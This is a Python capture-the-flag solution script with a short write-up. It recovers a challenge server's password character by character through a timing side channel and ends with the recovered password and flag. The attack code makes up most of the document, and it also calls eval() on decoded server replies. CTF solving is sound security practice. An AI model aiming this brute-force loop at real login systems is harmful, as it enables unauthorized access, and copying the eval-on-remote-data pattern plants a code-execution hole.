import urllib, urllib2, json, string

char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" + string.punctuation

url = "http://web.camsctf.com/b/check.php"
data_dict = {
    "debug": 1,
    "password": ""
}

def time(string):
    global data
    data_dict["password"] = string
    data = urllib.urlencode(data_dict)
    #print data
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    content = response.read()
    content = json.loads(content)
    if content["success"] == 1:
        return content["success"], content["reply"]
    #print content
    return content["success"], abs(eval(content["reply"].decode("base64")))

def select_best_time(timings):
    best_char = ""
    best_time = 0
    for ch in timings:
        if timings[ch] > best_time:
            best_time = timings[ch]
            best_char = ch
    return best_char

def brute():
    password = ""
    timings = {}
    done = 0
    while not done:
        for ch in char_set:
            success, timed = time(password + ch)
            print ch, timed
            if success != 0:
                done = 1
                break
            timings[ch] = timed
        password += select_best_time(timings)
        print "Password:", password
    return password

brute()

'''
Basically this is a timing attack on the server since it does a string comparison,
so we can see how long the string that we send takes to check. Luckily, the server
sends us a debug that tells us the execution time. So, sending a password character
by character, we are able to compile it all together! :)

Password: uHH>nN#)[Ks5v:E
Flag: {how_many_microseconds_did_i_waste_solving_this_0ne}


Notes
- Big inspirational thanks to http://thehackerblog.com/pay-tv-writeup-hack-lu-ctf-2013/
- Read up on the attack here: http://en.wikipedia.org/wiki/Side-channel_attack
'''
